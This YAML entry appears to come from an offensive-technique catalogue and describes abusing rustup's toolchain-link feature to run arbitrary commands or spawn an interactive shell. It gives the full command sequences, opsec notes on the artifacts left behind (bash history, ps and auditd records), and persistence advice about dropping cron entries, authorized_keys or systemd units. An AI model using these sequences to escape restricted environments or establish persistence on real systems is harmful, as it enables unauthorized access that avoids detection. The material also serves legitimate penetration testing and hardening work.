---
name: rustup
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: medium
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: command
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: |-
    mkdir /path/to/temp-dir/bin/
    mkdir /path/to/temp-dir/lib/
    echo '/path/to/command' >/path/to/temp-dir/bin/rustc
    chmod +x /path/to/temp-dir/bin/rustc
    rustup toolchain link x /path/to/temp-dir/
    rustup run x rustc
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    mkdir /path/to/temp-dir/bin/
    mkdir /path/to/temp-dir/lib/
    cp /bin/sh /path/to/temp-dir/bin/rustc
    rustup toolchain link x /path/to/temp-dir/
    rustup run x rustc
references:
- https://gtfobins.github.io/gtfobins/rustup/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
